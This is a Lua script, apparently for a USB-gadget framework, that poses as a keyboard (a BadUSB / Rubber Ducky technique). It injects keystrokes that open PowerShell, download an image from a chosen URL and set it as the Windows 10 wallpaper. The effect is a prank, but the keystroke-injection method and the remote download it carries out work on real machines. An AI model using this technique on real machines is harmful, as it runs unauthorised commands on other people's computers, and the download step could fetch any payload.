---
--- Change Windows 10 desktop wallpaper
---

require('common')

kb = luausb.create({ type = "keyboard" })

local file = prompt{
    message="Enter the URL of the wallpaper to download.",
    hint="Image URL",
    default="https://i.imgur.com/46wWHZ3.png"
}

while true do
    print("idle")

    -- poll until usb plugged in
    wait_for_state('configured')
    wait_for_detect(kb)
    print("running")

    kb:chord(MOD_LSUPER, KEY_R)
    wait(2000)
    kb:string("powershell\n")
    wait(2000)
    kb:string("[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" ..
            "(new-object System.Net.WebClient).DownloadFile('" .. file .. "',\"$Env:Temp\\b.jpg\");\n" ..
            "Add-Type @\"\n" ..
            "using System;using System.Runtime.InteropServices;using Microsoft.Win32;namespa" ..
            "ce W{public class S{ [DllImport(\"user32.dll\")]static extern int SystemParamet" ..
            "ersInfo(int a,int b,string c,int d);public static void SW(string a){SystemParam" ..
            "etersInfo(20,0,a,3);RegistryKey c=Registry.CurrentUser.OpenSubKey(\"Control Pan" ..
            "el\\\\Desktop\",true);c.SetValue(@\"WallpaperStyle\", \"2\");c.SetValue(@\"Tile" ..
            "Wallpaper\", \"0\");c.Close();}}}\n" ..
            "\"@\n" ..
            "[W.S]::SW(\"$Env:Temp\\b.jpg\")\n" ..
            "exit\n")

    print("done")
    wait_for_state("not attached")
end